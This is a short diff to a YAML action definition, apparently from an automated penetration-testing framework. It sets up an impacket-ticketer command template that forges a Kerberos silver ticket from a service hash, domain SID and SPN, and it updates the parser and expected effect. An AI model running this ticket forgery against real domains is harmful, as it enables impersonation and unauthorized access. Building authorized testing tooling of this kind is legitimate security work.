@@ -7,9 +7,9 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: impacket-ticketer -nthash '{service_hash}' -domain-sid '{sid}' -domain
   {domain} -spn '{spn}' '{target_user}'
-parser: null
+parser: impacket_parser
 expected_effects:
-- action_completed
+- silver_ticket_forged
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
